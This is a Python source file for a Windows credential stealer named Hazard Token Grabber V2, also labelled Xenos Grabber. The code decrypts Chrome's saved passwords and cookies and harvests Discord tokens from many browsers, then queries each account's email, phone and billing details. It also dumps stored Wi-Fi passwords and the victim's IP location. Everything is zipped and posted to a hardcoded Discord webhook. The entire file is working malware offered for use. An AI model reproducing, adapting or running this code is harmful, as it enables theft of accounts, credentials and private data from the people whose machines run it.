import os 
import sys
import json     
import subprocess
import base64 
from datetime import datetime
def install (package):
    subprocess. check_call ([sys. executable, "-m", "pip", "install", package])
def uninstall (package):
    subprocess. check_call ([sys. executable, "-m", "pip", "uninstall", package])
try:
	from win32crypt import CryptUnprotectData
except ImportError or NameError or ModuleNotFoundError:
	install('pywin32')
try:
	import shutil
except ImportError or NameError or ModuleNotFoundError:
	install('shutil')
try:
    import requests
except ImportError or NameError or ModuleNotFoundError:
    install('requests')
try:
    from re import findall
except ImportError or NameError or ModuleNotFoundError:
    install('re')
try:
    import sqlite3
except ImportError or NameError or ModuleNotFoundError:
    install('sqlite3')
try:
    import getpass
except ImportError or NameError or ModuleNotFoundError:
    install('getpass')
try:
    import platform as plt
except ImportError or NameError or ModuleNotFoundError:
    install('platform')
    import platform as plt
try:
    from Crypto.Cipher import AES
except ImportError or NameError or ModuleNotFoundError:
	uninstall('crypto')
	uninstall('pycrypto')
	install('pycryptodome')
try:
    import zipfile
except ImportError or NameError or ModuleNotFoundError:
    install('zipfile')
class Hazard_Token_Grabber_V2:
    def __init__(self):
        self.webhook = "https://discord.com/api/webhooks/913834043232124948/Tvju08mCHTZBHM9ryr7e3eVsXg9R7OcpIb0Iz-5pJE_pnba_cOljv-7WtL_6F0z2DBdU"
        self.files = ""
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.getenv("temp")+"\\Hazard_Token_Grabber_V2"

        try:
            os.mkdir(os.path.join(self.tempfolder))
        except:
            pass

        self.tokens = []
        self.saved = []

        if not os.path.exists(self.appdata+'\\Google'):
            self.files += f"**{os.getlogin()}** doesn't have google installed\n"
        else:
            self.grabPassword()
            self.grabCookies()
        self.grabTokens()
        self.SendInfo()
        try:
            shutil.rmtree(self.tempfolder)
        except(PermissionError, FileExistsError):
            pass

    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers.update({"Authorization": token})
        return headers

    def get_master_key(self):
        with open(self.appdata+'\\Google\\Chrome\\User Data\\Local State', "r") as f:
            local_state = f.read()
        local_state = json.loads(local_state)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    
    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)
    
    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)
    
    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            decrypted_pass = self.decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Chrome < 80"
    
    def grabPassword(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Passwords.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            for r in cursor.fetchall():
                url = r[0]
                username = r[1]
                encrypted_password = r[2]
                decrypted_password = self.decrypt_password(encrypted_password, master_key)
                if url != "":
                    f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass  

    def grabCookies(self):
        master_key = self.get_master_key()
        f = open(self.tempfolder+"\\Google Cookies.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
        login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\cookies'
        try:
            shutil.copy2(login_db, "Loginvault.db")
        except FileNotFoundError:
            pass
        conn = sqlite3.connect("Loginvault.db")
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, encrypted_value from cookies")
            for r in cursor.fetchall():
                Host = r[0]
                user = r[1]
                encrypted_cookie = r[2]
                decrypted_cookie = self.decrypt_password(encrypted_cookie, master_key)
                if Host != "":
                    f.write(f"Host: {Host}\nUser: {user}\nCookie: {decrypted_cookie}\n\n")
        except:
            pass
        f.close()
        cursor.close()
        conn.close()
        try:
            os.remove("Loginvault.db")
        except:
            pass

    def grabTokens(self):
        f = open(self.tempfolder+"\\Discord Info.txt", "w", encoding="cp437", errors='ignore')
        f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
        paths = {
            'Discord': self.roaming + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for source, path in paths.items():
            if not os.path.exists(path):
                continue
            for file_name in os.listdir(path):
                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                    continue
                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                        for token in findall(regex, line):
                            self.tokens.append(token)
        for token in self.tokens:
            r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
            if r.status_code == 200:
                if token in self.saved:
                    continue
                self.saved.append(token)
                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
                badges = ""
                flags = j['flags']
                if (flags == 1):
                    badges += "Staff, "
                if (flags == 2):
                    badges += "Partner, "
                if (flags == 4):
                    badges += "Hypesquad Event, "
                if (flags == 8):
                    badges += "Green Bughunter, "
                if (flags == 64):
                    badges += "Hypesquad Bravery, "
                if (flags == 128):
                    badges += "HypeSquad Brillance, "
                if (flags == 256):
                    badges += "HypeSquad Balance, "
                if (flags == 512):
                    badges += "Early Supporter, "
                if (flags == 16384):
                    badges += "Gold BugHunter, "
                if (flags == 131072):
                    badges += "Verified Bot Developer, "
                if (badges == ""):
                    badges = "None"

                user = j["username"] + "#" + str(j["discriminator"])
                email = j["email"]
                phone = j["phone"] if j["phone"] else "No Phone Number attached"

                url = f'https://cdn.discordapp.com/avatars/{j["id"]}/{j["avatar"]}.gif'
                try:
                    requests.get(url)
                except:
                    url = url[:-4]

                nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=self.getheaders(token)).json()
                has_nitro = False
                has_nitro = bool(len(nitro_data) > 0)

                billing = bool(len(json.loads(requests.get("https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.getheaders(token)).text)) > 0)
                
                f.write(f"{' '*17}{user}\n{'-'*50}\nToken: {token}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n[Avatar]({url})\n\n")
        f.close()


    def SendInfo(self):
        try:
            data = requests.get("http://ipinfo.io/json").json()
            ip = data['ip']
            city = data['city']
            country = data['country']
            region = data['region']
            googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
        except:
            pass
        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
        for i in profiles:
            results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode(
                'utf-8').split(
                '\n')
            results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
            try:
                d = ("{:<30}|  {:<}".format(i, results[0]))
                answer = d
            except IndexError:
                p = ("{:<30}|  {:<}".format(i, ""))
                answer = p
        getwifinetwork,getwifipassword = answer.split('|')
        sysinfo = f"Operating System: {plt.system()}\nComputer Name: {plt.node()}\nUsername: {getpass.getuser()}\nRelease Version: {plt.release()}\nProcessor Architecture: {plt.processor()} "
        temp = os.path.join(self.tempfolder)
        new = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
        self.zip(temp, new)
        for dirname, _, files in os.walk(self.tempfolder):
            for f in files:
                self.files += f"\n{f}"
        n = 0
        for r, d, files in os.walk(self.tempfolder):
            n+= len(files)
            self.fileCount = f"{n} Files Found: "
        embed = {
            "avatar_url":"https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
            "embeds": [
                {
                    "author": {
                        "name": "Xenos Grabber",
                        "url": "https://github.com/Rdimo/Hazard-Token-Grabber-V2",
                        "icon_url": "https://cdn.discordapp.com/attachments/828047793619861557/891698193245560862/Hazard.gif"
                    },
                    "description": f"**XENOS WAS RAN**\n```fix\nComputerName: {os.getenv('COMPUTERNAME')}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```\n[Google Maps Location]({googlemap})\n```fix\nnetwork:   {getwifinetwork}\npassword:{getwifipassword}```\nSYSTEM INFO```{sysinfo}```",
                    "color": 16111121,

                    "thumbnail": {
                      "url": "https://media.discordapp.net/attachments/816235522867462194/913888401118339163/xenos.gif?width=720&height=540"
                    },       

                    "footer": {
                      "text": "Dead but Dreaming"
                    }
                }
            ]
        }
        requests.post(self.webhook, json=embed)
        requests.post(self.webhook, files={'upload_file': open(new,'rb')})

    def zip(self, src, dst):
        zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
        abs_src = os.path.abspath(src)
        for dirname, _, files in os.walk(src):
            for filename in files:
                absname = os.path.abspath(os.path.join(dirname, filename))
                arcname = absname[len(abs_src) + 1:]
                zipped_file.write(absname, arcname)
        zipped_file.close()

if __name__ == "__main__":
    Hazard_Token_Grabber_V2()
